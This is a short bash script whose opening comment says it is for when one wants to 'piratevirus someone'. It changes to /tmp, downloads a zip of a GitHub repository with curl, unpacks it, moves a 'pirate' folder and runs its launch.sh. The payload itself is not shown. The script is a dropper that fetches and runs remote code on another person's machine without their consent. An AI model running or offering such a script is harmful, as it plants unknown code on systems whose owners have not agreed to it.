#!/bin/bash

# If you just want to piratevirus someone
# this depends on them having git installed.
# ... maybe I should just have it download a zip...

cd /tmp
curl -o pirate.zip https://codeload.github.com/phobosgroup/dtc2/zip/master
unzip pirate.zip
cd dtc2-master
mv pirate ../piratefiles
cd ../
rm -rf dtc2
cd piratefiles
sh launch.sh
